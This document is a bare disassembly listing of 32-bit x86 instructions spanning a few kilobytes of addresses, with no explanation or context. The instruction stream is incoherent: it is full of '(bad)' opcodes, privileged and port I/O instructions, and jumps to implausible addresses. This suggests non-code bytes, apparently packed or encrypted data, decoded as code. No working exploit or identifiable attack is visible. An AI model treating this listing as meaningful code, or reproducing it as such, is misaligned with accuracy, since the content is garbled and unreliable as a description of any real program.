  4146ac:	jno    0x41464a
  4146ae:	ret    
  4146af:	mov    bh,0x8e
  4146b1:	mov    edi,0x584685ae
  4146b6:	inc    esp
  4146b7:	call   0xc20b3481
  4146bc:	leave  
  4146bd:	adc    BYTE PTR [edx],bh
  4146bf:	mov    cl,0xaf
  4146c1:	add    BYTE PTR [edx],al
  4146c3:	jo     0x4146d6
  4146c5:	lods   eax,DWORD PTR ds:[esi]
  4146c6:	aaa    
  4146c7:	mov    gs,WORD PTR [edx]
  4146c9:	lods   al,BYTE PTR ds:[esi]
  4146ca:	inc    edi
  4146cb:	pop    esi
  4146cc:	mov    edx,0x70a57996
  4146d1:	xlat   BYTE PTR ds:[ebx]
  4146d2:	daa    
  4146d3:	dec    edx
  4146d4:	xchg   ecx,eax
  4146d5:	jp     0x4146c6
  4146d7:	sbb    DWORD PTR [ebx+0x67],ebx
  4146da:	idiv   DWORD PTR ds:0xaace30b2
  4146e0:	mov    dh,0x4e
  4146e2:	mov    edx,esp
  4146e4:	(bad)  
  4146e5:	pushf  
  4146e6:	aas    
  4146e7:	jmp    0x4146c7
  4146e9:	push   ecx
  4146ea:	shr    BYTE PTR [ecx+0x12b6e54c],cl
  4146f0:	ds xor edi,ebp
  4146f3:	fwait
  4146f4:	mov    eax,DWORD PTR [edi-0x1]
  4146f7:	cmp    BYTE PTR [edi],ch
  4146f9:	mov    bl,0x26
  4146fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146fc:	lock push ecx
  4146fe:	int    0xa8
  414700:	ins    BYTE PTR es:[edi],dx
  414701:	int    0xf6
  414703:	sbb    BYTE PTR ds:0xdf97aa50,bh
  414709:	xor    BYTE PTR [esi],bl
  41470b:	(bad)  
  41470c:	xchg   ebx,eax
  41470d:	and    BYTE PTR [eax+ebp*4],bl
  414710:	cmp    DWORD PTR [edi+0x36],edi
  414713:	lea    edi,[eax+0x7301378]
  414719:	lods   al,BYTE PTR ds:[esi]
  41471a:	mov    esi,0x11227aab
  41471f:	aad    0x5b
  414721:	test   BYTE PTR [edx+eiz*2+0x76],bl
  414725:	test   al,0x67
  414727:	ins    DWORD PTR es:[edi],dx
  414728:	neg    DWORD PTR [edi+edx*1-0x56]
  41472c:	mov    ds:0x7775c08a,al
  414731:	pop    ebp
  414732:	rol    eax,cl
  414734:	push   esi
  414735:	cdq    
  414736:	aaa    
  414737:	sub    BYTE PTR [edx],bh
  414739:	mov    eax,ds:0xd175d83d
  41473e:	jb     0x414766
  414740:	fisub  WORD PTR [edx-0x290524a9]
  414746:	mov    bl,0x61
  414748:	and    al,0x27
  41474a:	jp     0x414709
  41474c:	bound  esp,QWORD PTR [edx-0x5f]
  41474f:	or     al,0x5c
  414751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414752:	dec    edx
  414753:	fs mov cl,0xfb
  414756:	out    dx,eax
  414757:	cmp    al,0x93
  414759:	sahf   
  41475a:	rcl    BYTE PTR [eax+0x8fc31d9],0x13
  414761:	pop    ebp
  414762:	out    0xb8,al
  414764:	jp     0x41474e
  414766:	inc    ebp
  414767:	dec    edi
  414768:	mov    ebx,0xadc7e651
  41476d:	int3   
  41476e:	cmp    al,0x50
  414770:	(bad)  
  414771:	adc    al,0x4
  414773:	ret    0xfe4c
  414776:	scas   al,BYTE PTR es:[edi]
  414777:	push   ecx
  414778:	mov    dl,0x58
  41477a:	fisttp WORD PTR [edx-0x4f]
  41477d:	push   ss
  41477e:	stos   BYTE PTR es:[edi],al
  41477f:	test   BYTE PTR [esi],al
  414781:	xchg   esi,eax
  414782:	xor    eax,0x789a0212
  414788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414789:	je     0x414765
  41478b:	in     eax,0xeb
  41478d:	or     al,0xf6
  41478f:	adc    ebx,edx
  414791:	xchg   ebx,eax
  414792:	push   es
  414793:	push   esi
  414794:	xlat   BYTE PTR ds:[ebx]
  414795:	push   esi
  414796:	loop   0x414813
  414798:	or     al,cl
  41479a:	daa    
  41479b:	or     DWORD PTR [edi-0x6c037dbd],edi
  4147a1:	adc    DWORD PTR [edx+0x41d5fb81],ebp
  4147a7:	(bad)  
  4147a8:	mov    dl,0x6e
  4147aa:	mov    dh,0xca
  4147ac:	outs   dx,DWORD PTR ds:[esi]
  4147ad:	xor    eax,0xb4146741
  4147b2:	fwait
  4147b3:	int3   
  4147b4:	(bad)  
  4147b5:	sbb    DWORD PTR [edx],ebx
  4147b7:	sbb    ch,ah
  4147b9:	les    esi,FWORD PTR [esi+esi*8+0xeb6a9a8]
  4147c0:	in     al,0x52
  4147c2:	add    DWORD PTR [edi-0x7620402f],eax
  4147c8:	repz pop ebp
  4147ca:	aaa    
  4147cb:	xchg   DWORD PTR [edx],ebx
  4147cd:	jno    0x41482a
  4147cf:	mov    edx,0xf22814c5
  4147d4:	neg    DWORD PTR cs:[ecx]
  4147d7:	cld    
  4147d8:	jp     0x414761
  4147da:	stos   DWORD PTR es:[edi],eax
  4147db:	and    bh,al
  4147dd:	aaa    
  4147de:	scas   al,BYTE PTR es:[edi]
  4147df:	loop   0x41484d
  4147e1:	jnp    0x4147ec
  4147e3:	or     BYTE PTR [esi-0x26],0xe6
  4147e7:	dec    esi
  4147e8:	cmp    eax,0x70b5d03e
  4147ed:	(bad)  
  4147ee:	and    BYTE PTR [ecx],dh
  4147f0:	or     al,0xab
  4147f2:	retf   
  4147f3:	jge    0x41480a
  4147f5:	fdivrp st(0),st
  4147f7:	pop    ds
  4147f8:	inc    ecx
  4147f9:	fs sub eax,0x87fd627d
  4147ff:	inc    ebp
  414800:	xor    al,0x1c
  414802:	in     eax,dx
  414803:	dec    esp
  414804:	sub    bl,BYTE PTR [esi-0x4b37a580]
  41480a:	sbb    eax,0xa68658ca
  41480f:	mov    cl,al
  414811:	aas    
  414812:	jp     0x4147c1
  414814:	add    bh,bl
  414816:	hlt    
  414817:	xchg   esi,eax
  414818:	(bad)  [esi+0x5f]
  41481b:	inc    esi
  41481c:	(bad)  
  41481d:	adc    BYTE PTR [edx],ah
  41481f:	and    al,0x8a
  414821:	fbstp  TBYTE PTR gs:[ecx]
  414824:	pop    eax
  414825:	mov    al,0xa7
  414827:	push   ecx
  414828:	div    DWORD PTR [eax]
  41482a:	sub    DWORD PTR [edx+ebp*8-0x21e3ff06],ebp
  414831:	rol    DWORD PTR [ebx+0x3731f09a],cl
  414837:	lock jns 0x414800
  41483a:	sti    
  41483b:	fidivr WORD PTR [ebp-0x1f]
  41483e:	push   0x86a38a21
  414843:	jp     0x414848
  414845:	enter  0x6a4a,0xfc
  414849:	mov    edx,0xbb1fc791
  41484e:	test   eax,0x6137462c
  414853:	push   edx
  414854:	shl    BYTE PTR [eax-0x4d29eb8d],0x77
  41485b:	test   BYTE PTR [edi-0x79d25e58],cl
  414861:	cmp    ah,BYTE PTR [ebx+0x19]
  414864:	jmp    0xae8f8f9f
  414869:	lahf   
  41486a:	inc    ebx
  41486b:	or     edx,edx
  41486d:	aam    0x67
  41486f:	inc    esi
  414870:	in     eax,dx
  414871:	push   esp
  414872:	pop    ebx
  414873:	and    BYTE PTR [esi-0x6c],dh
  414876:	xchg   esi,eax
  414877:	jmp    0x41483b
  414879:	scas   eax,DWORD PTR es:[edi]
  41487a:	bound  edx,QWORD PTR [ecx+0x47]
  41487d:	mov    ebp,0xa3944b9e
  414882:	or     DWORD PTR [esp+edi*2],ecx
  414885:	mov    eax,0xe2f191d
  41488a:	fsub   st(3),st
  41488c:	not    DWORD PTR [edx+0x7c]
  41488f:	scas   eax,DWORD PTR es:[edi]
  414890:	adc    bh,bl
  414892:	mov    bl,0x44
  414894:	ss nop
  414896:	(bad)  
  414897:	xor    BYTE PTR [ebx+ebx*4-0x57919113],cl
  41489e:	xchg   ebx,eax
  41489f:	mov    ah,0xe4
  4148a1:	inc    ecx
  4148a2:	ret    
  4148a3:	(bad)  
  4148a4:	repnz in eax,dx
  4148a6:	cmp    al,0x9a
  4148a8:	xor    DWORD PTR [eax],edi
  4148aa:	retf   0x9659
  4148ad:	shr    DWORD PTR [eax-0x4],cl
  4148b0:	mov    bl,0x6d
  4148b2:	mov    eax,ds:0x85ba2fc7
  4148b7:	mov    DWORD PTR es:[edi-0x71c31a28],edi
  4148be:	mov    bh,0xa2
  4148c0:	lock xchg edx,eax
  4148c2:	push   esp
  4148c3:	std    
  4148c4:	aaa    
  4148c5:	popa   
  4148c6:	into   
  4148c7:	cmc    
  4148c8:	mov    ebx,0x2df48cb8
  4148cd:	loope  0x41494d
  4148cf:	or     ah,BYTE PTR [esi]
  4148d1:	repz cs in eax,dx
  4148d4:	add    al,0xeb
  4148d6:	cld    
  4148d7:	mov    ah,0x1f
  4148d9:	mov    ?,ebp
  4148db:	int3   
  4148dc:	out    0x8a,al
  4148de:	hlt    
  4148df:	dec    edi
  4148e0:	inc    eax
  4148e1:	retf   0x86c4
  4148e4:	xchg   edi,eax
  4148e5:	(bad)  
  4148e6:	aas    
  4148e7:	inc    ebp
  4148e8:	jp     0x4148d3
  4148ea:	cs (bad) 
  4148ec:	cmp    al,0xd6
  4148ee:	lahf   
  4148ef:	in     al,0x58
  4148f1:	arpl   si,bp
  4148f3:	repnz fild QWORD PTR [ebx]
  4148f6:	jbe    0x41490f
  4148f8:	mov    bh,0x7
  4148fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148fb:	and    bh,dh
  4148fd:	push   cs
  4148fe:	cmp    edx,ebp
  414900:	mov    al,BYTE PTR [esi+0x15f3b6b7]
  414906:	data16 sar BYTE PTR [ebp+0xf],0x20
  41490b:	test   ecx,esi
  41490d:	jno    0x4148d5
  41490f:	dec    ebp
  414910:	jb     0x4148b1
  414912:	inc    esi
  414913:	cmp    ah,BYTE PTR [esi+eiz*8-0x51]
  414917:	mov    al,0x88
  414919:	ror    BYTE PTR [ebx+ebp*8+0x1a],cl
  41491d:	jb     0x414955
  41491f:	shl    al,cl
  414921:	bound  ebx,QWORD PTR [ecx-0x3b4e4a2f]
  414927:	call   0x4631:0x58c1faf3
  41492e:	jl     0x41495d
  414930:	jle    0x4148db
  414932:	pop    es
  414933:	jnp    0x4148e6
  414935:	pop    edi
  414936:	sbb    bh,BYTE PTR [ecx]
  414938:	sub    dh,al
  41493a:	cld    
  41493b:	into   
  41493c:	js     0x4148f9
  41493e:	das    
  41493f:	dec    eax
  414940:	mov    dl,BYTE PTR [edi-0x2e]
  414943:	mov    ds:0xd1f94192,al
  414948:	jbe    0x4149c0
  41494a:	xlat   BYTE PTR ds:[ebx]
  41494b:	xchg   esp,eax
  41494c:	add    eax,0xf73e309a
  414951:	mov    edx,0xaabd6aa5
  414956:	adc    al,0xe0
  414958:	inc    esi
  414959:	loop   0x414997
  41495b:	mov    esp,DWORD PTR [esp+eax*4]
  41495e:	out    dx,eax
  41495f:	ss push es
  414961:	out    0x4f,al
  414963:	xlat   BYTE PTR ds:[ebx]
  414964:	ret    0x388d
  414967:	pop    ds
  414968:	xlat   BYTE PTR ds:[ebx]
  414969:	mov    bh,0x7a
  41496b:	ds add al,0xfd
  41496e:	cmp    BYTE PTR [eax],ch
  414970:	lds    edx,FWORD PTR [ebx+0x621ed2e]
  414976:	or     DWORD PTR [eax-0x35],0x9f8ef701
  41497d:	dec    esi
  41497e:	addr16 mov ah,0x29
  414981:	mov    edx,?
  414983:	cmp    ebp,DWORD PTR [esi+0x57cae06c]
  414989:	(bad)  
  41498b:	pop    edi
  41498c:	pop    ebp
  41498d:	arpl   WORD PTR [edx+0x57],ax
  414990:	jg     0x4149e2
  414992:	out    0x2f,eax
  414994:	mov    ebx,0xad8412a
  414999:	and    DWORD PTR [edi+0x5659dc31],0xb618e28b
  4149a3:	inc    edi
  4149a4:	enter  0x7df9,0x45
  4149a8:	lock (bad) 
  4149aa:	mov    ch,0x2b
  4149ac:	ins    BYTE PTR es:[edi],dx
  4149ad:	xchg   esp,eax
  4149ae:	stos   DWORD PTR es:[edi],eax
  4149af:	jp     0x4149ec
  4149b1:	ret    
  4149b2:	xor    ebx,DWORD PTR [edx+eiz*4-0x7f]
  4149b6:	jmp    0x46c6119e
  4149bb:	(bad)  [ebx+0x20]
  4149be:	stc    
  4149bf:	cld    
  4149c0:	lock jl 0x414969
  4149c3:	rcr    BYTE PTR [ecx+ebp*1+0x7],cl
  4149c7:	cwde   
  4149c8:	aam    0x8
  4149ca:	cld    
  4149cb:	arpl   WORD PTR [ebx+0x446b0696],cx
  4149d1:	aas    
  4149d2:	and    ecx,DWORD PTR [esi]
  4149d4:	mov    ds:0x531ca795,eax
  4149d9:	(bad)  
  4149da:	in     eax,dx
  4149db:	mov    dh,0x29
  4149dd:	sub    al,0xa6
  4149df:	loopne 0x4149cb
  4149e1:	sub    esi,DWORD PTR [esi-0x1978cb28]
  4149e7:	add    esp,DWORD PTR [edi+esi*8-0x52]
  4149eb:	mov    fs,WORD PTR [ebp-0x6a]
  4149ee:	inc    edi
  4149ef:	xchg   DWORD PTR [ebp-0x18],ebp
  4149f2:	mov    ebx,0x3fd15cfd
  4149f7:	xchg   ecx,eax
  4149f8:	cdq    
  4149f9:	xor    al,0x3b
  4149fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149fc:	mov    dh,0xfd
  4149fe:	jp     0x414a06
  414a00:	or     ecx,DWORD PTR [edi+0x7ca7789e]
  414a06:	and    edx,DWORD PTR [esi]
  414a08:	test   DWORD PTR [edx-0x1e1d3bc9],0x13a9be00
  414a12:	in     al,dx
  414a13:	mov    edi,0xb9b4ae19
  414a18:	add    bh,bl
  414a1a:	adc    eax,0xa4054f2e
  414a1f:	add    BYTE PTR [edi-0x30],0xc1
  414a23:	jge    0x414a20
  414a25:	ret    0x1a34
  414a28:	shr    DWORD PTR ss:[ecx+0x3d],0xf
  414a2d:	xchg   esp,eax
  414a2e:	push   0xbe10936f
  414a33:	lds    ecx,FWORD PTR [edi+0x23203eff]
  414a39:	(bad)  
  414a3a:	cld    
  414a3b:	push   edx
  414a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a3d:	ja     0x414aad
  414a3f:	dec    edi
  414a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a41:	jecxz  0x414a47
  414a43:	mov    al,ch
  414a45:	fucomip st,st(7)
  414a47:	daa    
  414a48:	mov    eax,0xd8582ff2
  414a4d:	fidiv  WORD PTR [eax+0x17f4724b]
  414a53:	out    0x1e,al
  414a55:	xchg   ebx,eax
  414a56:	pusha  
  414a57:	not    DWORD PTR [ecx-0x34af057e]
  414a5d:	jmp    0x88533bb5
  414a62:	adc    eax,0xb96a7983
  414a67:	adc    edx,ebp
  414a69:	js     0x414a42
  414a6b:	push   es
  414a6c:	mov    ds:0xd51801f0,al
  414a71:	xchg   ecx,eax
  414a72:	pop    ds
  414a73:	or     esi,DWORD PTR [ecx-0x4a241270]
  414a79:	pop    ebp
  414a7a:	loope  0x414ab2
  414a7c:	fistp  QWORD PTR [esi+0x127c8164]
  414a82:	arpl   WORD PTR [edi],sp
  414a84:	adc    dl,bl
  414a86:	imul   ecx,DWORD PTR [edi+0x16ec0036],0x19cf22bf
  414a90:	or     BYTE PTR [edx],bh
  414a92:	pusha  
  414a93:	jnp    0x414ab5
  414a95:	loop   0x414b10
  414a97:	sub    DWORD PTR [esi],edx
  414a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a9a:	mov    bh,0x25
  414a9c:	in     eax,dx
  414a9d:	ror    al,0x51
  414aa0:	outs   dx,BYTE PTR ds:[esi]
  414aa1:	test   eax,0x4d340d12
  414aa6:	xchg   edi,eax
  414aa7:	aad    0xc7
  414aa9:	or     dh,BYTE PTR [eax]
  414aab:	sub    eax,0x29845bc7
  414ab0:	inc    ecx
  414ab1:	mov    WORD PTR [edx+0x53],es
  414ab4:	pop    eax
  414ab5:	jg     0x414a8d
  414ab7:	push   ecx
  414ab8:	ja     0x414ae7
  414aba:	dec    ecx
  414abb:	ins    DWORD PTR es:[edi],dx
  414abc:	jne    0x414ac5
  414abe:	jp     0x414b30
  414ac0:	cmp    al,0xb4
  414ac2:	retf   0x6796
  414ac5:	and    al,0x32
  414ac7:	jo     0x414aff
  414ac9:	repz call 0x952b97fc
  414acf:	ins    BYTE PTR es:[edi],dx
  414ad0:	push   ds
  414ad1:	push   es
  414ad2:	mov    edx,0x7a888ca3
  414ad7:	(bad)  
  414ad8:	test   eax,0x9b1bc7ac
  414add:	jb     0x414a89
  414adf:	adc    al,0x3b
  414ae1:	shl    BYTE PTR [esi],1
  414ae3:	pop    ebx
  414ae4:	jmp    0x414af2
  414ae6:	fmul   QWORD PTR [esi-0x5ea79c19]
  414aec:	ins    DWORD PTR es:[edi],dx
  414aed:	jge    0x414b29
  414aef:	pop    edx
  414af0:	xchg   edi,ebx
  414af2:	cmp    BYTE PTR [edx-0x2c],dh
  414af5:	das    
  414af6:	jne    0x414ab9
  414af8:	xchg   esp,eax
  414af9:	test   DWORD PTR [eax+eax*4],esp
  414afc:	sub    ebp,ebx
  414afe:	xor    al,0xb1
  414b00:	mov    ebx,0x6752953f
  414b05:	fsub   DWORD PTR ds:0x2fae35ea
  414b0b:	cmovs  edx,DWORD PTR [edx+0x79]
  414b0f:	loopne 0x414b75
  414b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b12:	inc    eax
  414b13:	(bad)  
  414b14:	out    0x6e,eax
  414b16:	jmp    DWORD PTR [ebx-0x10d94e8c]
  414b1c:	nop
  414b1d:	jp     0x414b39
  414b1f:	inc    ebp
  414b20:	cmp    DWORD PTR [esi-0x77],0xb27c79c5
  414b27:	or     edx,DWORD PTR [eax]
  414b29:	aad    0xa0
  414b2b:	push   ss
  414b2c:	lea    esi,[eax-0x42]
  414b2f:	jge    0x414b65
  414b31:	fcom   DWORD PTR [esi+0x59e303de]
  414b37:	mov    al,BYTE PTR [ecx]
  414b39:	push   ebx
  414b3a:	inc    esi
  414b3b:	nop
  414b3c:	mov    ah,0xd6
  414b3e:	xchg   esp,eax
  414b3f:	push   ss
  414b40:	and    eax,0x7dc8e22
  414b45:	pushf  
  414b46:	pop    esi
  414b47:	cmp    eax,DWORD PTR [ebx+0x57375721]
  414b4d:	xchg   DWORD PTR [ebp-0x30],ebx
  414b50:	mov    esi,0x5e700d3f
  414b55:	stos   DWORD PTR es:[edi],eax
  414b56:	nop
  414b57:	jl     0x414af0
  414b59:	dec    edi
  414b5a:	mov    ebp,0xc781353
  414b5f:	adc    DWORD PTR [edx+0x42e7571c],eax
  414b65:	mov    ebp,0x3869c62
  414b6a:	xlat   BYTE PTR ds:[ebx]
  414b6b:	push   ebx
  414b6c:	push   edx
  414b6d:	mov    ebx,0xcb9a758d
  414b72:	jp     0x414be1
  414b74:	lahf   
  414b75:	pcmpeqd mm2,QWORD PTR [edi+0x35]
  414b79:	xchg   BYTE PTR [ebx],ch
  414b7b:	fwait
  414b7c:	xor    ebp,edi
  414b7e:	push   esp
  414b7f:	repnz cmp eax,0xb1d1fef6
  414b85:	xchg   ecx,eax
  414b86:	dec    edx
  414b87:	nop
  414b88:	int3   
  414b89:	leave  
  414b8a:	sbb    al,0x9e
  414b8c:	push   ebp
  414b8d:	xor    al,0x57
  414b8f:	or     eax,0x2f5647af
  414b94:	mov    eax,ds:0xf8fb3e9c
  414b99:	jns    0x414bb9
  414b9b:	fwait
  414b9c:	scas   al,BYTE PTR es:[edi]
  414b9d:	imul   esi,ecx,0xffffffda
  414ba0:	xor    edi,esp
  414ba2:	mov    edx,0x3f5366f6
  414ba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ba8:	sbb    al,0xde
  414baa:	shl    BYTE PTR [eax],1
  414bac:	fisttp WORD PTR [ebp+0x3bec59ec]
  414bb2:	mov    edi,0x848283e
  414bb7:	in     eax,dx
  414bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bb9:	inc    ebx
  414bba:	and    bh,BYTE PTR [esi+0x46b9ef97]
  414bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc1:	mov    ebx,0xecae04ab
  414bc6:	add    BYTE PTR [eax],ch
  414bc8:	and    DWORD PTR [edx+0x71d3aa0c],0xcec5cc99
  414bd2:	dec    ebp
  414bd3:	mov    esi,0x7215f97f
  414bd8:	ja     0x414c1f
  414bda:	sbb    cl,BYTE PTR [ebp+0x36c17e25]
  414be0:	mov    esp,0xcb7c25d0
  414be5:	in     al,0x4c
  414be7:	push   edx
  414be8:	mov    ecx,0x930d72df
  414bed:	popa   
  414bee:	inc    esi
  414bef:	je     0x414c2a
  414bf1:	adc    BYTE PTR [ebp-0x5156ec28],0xac
  414bf8:	call   0xd536:0xc9110110
  414bff:	scas   al,BYTE PTR es:[edi]
  414c00:	retf   0xf316
  414c03:	ret    0xca6f
  414c06:	fistp  QWORD PTR [ecx]
  414c08:	in     eax,0xa7
  414c0a:	jle    0x414c42
  414c0c:	adc    DWORD PTR [ecx],edi
  414c0e:	lds    esp,FWORD PTR [eax+0x6d]
  414c11:	inc    eax
  414c12:	into   
  414c13:	aam    0xfc
  414c15:	icebp  
  414c16:	or     al,0x75
  414c18:	pop    es
  414c19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c1a:	ins    DWORD PTR es:[edi],dx
  414c1b:	pop    ebx
  414c1c:	jnp    0x414bcf
  414c1e:	jae    0x414c3a
  414c20:	ss adc eax,0xcec255f7
  414c26:	pop    ebx
  414c27:	(bad)
  414c2a:	pop    es
  414c2b:	mov    WORD PTR [ebx-0x690ab2c3],fs
  414c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c32:	jne    0x414c70
  414c34:	jl     0x414c77
  414c36:	pop    ds
  414c37:	js     0x414c51
  414c39:	cmp    bh,dh
  414c3b:	les    ecx,FWORD PTR [edi-0x59]
  414c3e:	jge    0x414c27
  414c40:	pop    eax
  414c41:	add    edx,DWORD PTR [ecx+0x3]
  414c44:	test   al,0x82
  414c46:	stos   DWORD PTR es:[edi],eax
  414c47:	pushf  
  414c48:	and    edi,DWORD PTR [ecx-0x6c1b7a52]
  414c4e:	out    dx,eax
  414c4f:	or     al,BYTE PTR [edx-0x6c]
  414c52:	push   ds
  414c53:	int    0xaf
  414c55:	pushf  
  414c56:	div    DWORD PTR [edi+0x36]
  414c59:	test   ebx,0x48f3443f
  414c5f:	and    eax,0xccbe5e6b
  414c64:	aaa    
  414c65:	sbb    al,0xab
  414c67:	xchg   edi,eax
  414c68:	cmp    DWORD PTR [ebp+0x443d91c2],esi
  414c6e:	sti    
  414c6f:	ror    DWORD PTR [ecx+0x13],cl
  414c72:	ret    0xae09
  414c75:	test   DWORD PTR [esp+eax*4-0x7b],esi
  414c79:	push   ebx
  414c7a:	(bad)
  414c7e:	mov    edi,esp
  414c80:	cli    
  414c81:	inc    eax
  414c82:	(bad)  
  414c83:	sub    eax,0x75d6f74f
  414c88:	dec    edx
  414c89:	jne    0x414ce8
  414c8b:	shl    esi,cl
  414c8d:	fstp   QWORD PTR [esi]
  414c8f:	int    0x34
  414c91:	mov    dl,0xad
  414c93:	or     al,BYTE PTR ds:0x99bc7b53
  414c99:	add    eax,0x9812e377
  414c9e:	sub    DWORD PTR [ecx+eax*2-0xe66ebb3],esp
  414ca5:	mov    ds:0x3e942378,al
  414caa:	jge    0x414cb0
  414cac:	inc    esi
  414cad:	xlat   BYTE PTR ds:[ebx]
  414cae:	lock and ax,0x5866
  414cb3:	hlt    
  414cb4:	push   0x79
  414cb6:	adc    al,0xd
  414cb8:	jb     0x414ccc
  414cba:	js     0x414c8c
  414cbc:	and    BYTE PTR [ebx+0x61],dh
  414cbf:	push   esi
  414cc0:	push   ss
  414cc1:	fcmove st,st(6)
  414cc3:	and    eax,0x7e4b3f63
  414cc8:	pushf  
  414cc9:	sub    DWORD PTR [ecx],0x59
  414ccc:	fs fadd st,st(3)
  414ccf:	shl    DWORD PTR [edi-0x73debee5],1
  414cd5:	jp     0x414cfe
  414cd7:	ja     0x414d58
  414cd9:	test   DWORD PTR [esi+0x1e],esi
  414cdc:	cmp    al,0xd7
  414cde:	iret   
  414cdf:	hlt    
  414ce0:	aam    0x95
  414ce2:	push   edx
  414ce3:	enter  0x3e8,0x68
  414ce7:	inc    ebp
  414ce8:	cwde   
  414ce9:	idiv   DWORD PTR [esi]
  414ceb:	sub    al,0xc3
  414ced:	or     ah,BYTE PTR [esp+eax*1-0x5a409691]
  414cf4:	sbb    DWORD PTR [esi+0x277b16e0],esp
  414cfa:	jae    0x414d6e
  414cfc:	sbb    BYTE PTR [ebp+esi*1-0x7e600aa8],bh
  414d03:	sbb    al,dh
  414d05:	cmp    al,0xcc
  414d07:	out    dx,eax
  414d08:	popa   
  414d09:	sbb    edx,ebp
  414d0b:	pusha  
  414d0c:	push   ds
  414d0d:	stos   DWORD PTR es:[edi],eax
  414d0e:	pop    edi
  414d0f:	sbb    BYTE PTR [ecx],0xaf
  414d12:	xchg   esi,eax
  414d13:	lods   al,BYTE PTR ds:[esi]
  414d14:	neg    ebp
  414d16:	fimul  DWORD PTR ds:0x37126ada
  414d1c:	jecxz  0x414d25
  414d1e:	sysexit 
  414d20:	retf   
  414d21:	mov    ds:0x45dd6c8f,al
  414d26:	add    eax,0xfb889361
  414d2b:	add    eax,0xf4556dd0
  414d30:	sbb    al,0x20
  414d32:	mov    edx,0xf5a604a4
  414d37:	and    eax,0x57cf5908
  414d3c:	pavgw  mm5,QWORD PTR [ebp+0x8938eb9]
  414d43:	gs shr cl,1
  414d46:	fbld   TBYTE PTR [eax-0x3a951f3f]
  414d4c:	cmp    eax,0x3798908c
  414d51:	xor    DWORD PTR [eax-0x22687e4],edi
  414d57:	ins    DWORD PTR es:[edi],dx
  414d58:	cmc    
  414d59:	sbb    cl,cl
  414d5b:	int3   
  414d5c:	je     0x414d56
  414d5e:	(bad)  
  414d60:	adc    al,0xb3
  414d62:	add    esp,DWORD PTR [eax-0x6c]
  414d65:	gs xchg dh,dl
  414d68:	pop    edi
  414d69:	rol    ch,0x40
  414d6c:	aaa    
  414d6d:	jns    0x414cf1
  414d6f:	push   ds
  414d70:	inc    esp
  414d71:	and    BYTE PTR [edi+ebx*8-0x6d],0x8a
  414d76:	enter  0xebf4,0xeb
  414d7a:	sbb    DWORD PTR [eax],edi
  414d7c:	fnsave [ebx+0x68]
  414d7f:	jecxz  0x414d33
  414d81:	cs dec ebx
  414d83:	push   cs
  414d84:	(bad)  
  414d85:	jnp    0x414de6
  414d87:	xchg   ebp,eax
  414d88:	adc    eax,0x364165b6
  414d8d:	out    0x94,al
  414d8f:	adc    BYTE PTR [ebp+0x22],bl
  414d92:	(bad)  
  414d93:	aam    0x6d
  414d95:	push   es
  414d96:	call   0x7574:0x882b77a3
  414d9d:	bts    DWORD PTR [ebx],edx
  414da0:	sti    
  414da1:	sbb    eax,0xe578c119
  414da6:	and    eax,0xd2e25dac
  414dab:	jl     0x414daf
  414dad:	imul   eax,DWORD PTR [eax-0x56],0xffffffab
  414db1:	cmp    ecx,esi
  414db3:	sub    ebp,eax
  414db5:	sti    
  414db6:	cli    
  414db7:	adc    DWORD PTR [ebx+0x70d4ad7e],eax
  414dbd:	mov    ebp,0x3aa65b27
  414dc2:	call   0x28712f2d
  414dc7:	ror    BYTE PTR [esi],cl
  414dc9:	stos   BYTE PTR es:[edi],al
  414dca:	test   DWORD PTR [eax-0x7e],eax
  414dcd:	inc    esi
  414dce:	jl     0x414d6e
  414dd0:	(bad)  
  414dd1:	pop    esp
  414dd2:	pop    esp
  414dd3:	pop    edi
  414dd4:	mov    eax,0xbf68e673
  414dd9:	push   edx
  414dda:	mov    al,ds:0x45788d21
  414ddf:	das    
  414de0:	sti    
  414de1:	test   bl,0x3b
  414de4:	jno    0x414db5
  414de6:	pushf  
  414de7:	mov    al,ds:0xdec6ad3b
  414dec:	jb     0x414e26
  414dee:	fwait
  414def:	pop    esi
  414df0:	push   esp
  414df1:	or     cl,ah
  414df3:	mov    ds:0xbfb16fbe,eax
  414df8:	outs   dx,DWORD PTR ds:[esi]
  414dfa:	mov    ebx,0x3c56a96b
  414dff:	sbb    DWORD PTR [esp+eiz*8-0x3c3c6361],0x6d37baaa
  414e0a:	stos   BYTE PTR es:[edi],al
  414e0b:	scas   al,BYTE PTR es:[edi]
  414e0c:	pop    esi
  414e0d:	rcr    BYTE PTR [edx-0x3c],1
  414e10:	jge    0x414e5a
  414e12:	sbb    esi,DWORD PTR [edx+ebp*1+0x51]
  414e16:	push   ecx
  414e17:	or     al,0x5e
  414e19:	mul    bh
  414e1b:	ja     0x414e11
  414e1d:	(bad)  
  414e1e:	pop    ss
  414e1f:	mov    ss,WORD PTR [esi-0x4b2a91d0]
  414e25:	sub    DWORD PTR fs:[ecx],ecx
  414e28:	lods   eax,DWORD PTR ds:[si]
  414e2a:	and    BYTE PTR [esi],al
  414e2c:	jecxz  0x414e64
  414e2e:	dec    edx
  414e2f:	sub    eax,0xcd6e2fe1
  414e34:	cmp    al,0xa9
  414e36:	xchg   ebx,eax
  414e37:	aad    0x3c
  414e39:	mov    esi,DWORD PTR cs:[ebp-0x21]
  414e3d:	sbb    esp,0x9e724c4b
  414e43:	or     ch,BYTE PTR [edi]
  414e45:	xor    ebx,esp
  414e47:	fimul  DWORD PTR [ebx-0x35]
  414e4a:	(bad)  
  414e4b:	out    dx,al
  414e4c:	and    al,0x1c
  414e4e:	sbb    BYTE PTR [eax],0xf7
  414e51:	mov    al,0x9a
  414e53:	xlat   BYTE PTR ds:[ebx]
  414e54:	or     ebp,DWORD PTR ds:[ebx]
  414e57:	aas    
  414e58:	out    0x4c,al
